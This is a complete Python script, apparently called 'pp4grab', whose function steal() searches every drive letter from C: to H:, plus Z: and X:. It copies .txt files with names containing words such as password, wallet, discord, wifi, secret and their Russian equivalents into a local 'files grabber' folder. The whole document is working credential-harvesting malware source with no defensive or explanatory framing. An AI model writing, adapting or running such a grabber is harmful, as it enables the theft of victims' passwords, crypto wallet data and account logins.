import os
import sys
import shutil

os.makedirs('files grabber', exist_ok=True)

tdisc = ['C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'Z:\\', 'X:\\']

tfile = ['password', 'pass', 'login', 'discord', 'secret', 'wallet', 'wifi', 'parol', 'mail', 'email', 'пароль', 'пасс', 'данные', 'важное', 'пароли', 'секрет', 'роутер', 'почта',]

ttxt = '.txt'

ch = 0

tdir = os.path.dirname(sys.argv[0]).lower()

def steal():
    global ch
    print('pp4grab small.')
    print('Start founding files.')
    try:
        for grab in tdisc:
            for text, direct, files in os.walk(grab):
                if text.lower().startswith(tdir): continue
                for name in files:
                    try:
                        namey = name.lower()
                        namesplit, txtsplit = os.path.splitext(namey)
                        if txtsplit == ttxt:
                            for word in tfile:
                                if word in namesplit:
                                    grabdir = os.path.join(text, name)
                                    ch = ch + 1
                                    unicname = f'{ch} {name}'
                                    final = os.path.join('files grabber', unicname)
                                    shutil.copy(grabdir, final)
                                    break                   
                    except:
                        print(f'Error copypaste file: {name}')
        print('End copypaste files.')
    except:
        print('Error script txt data.')

steal()

input('Press enter for exit.')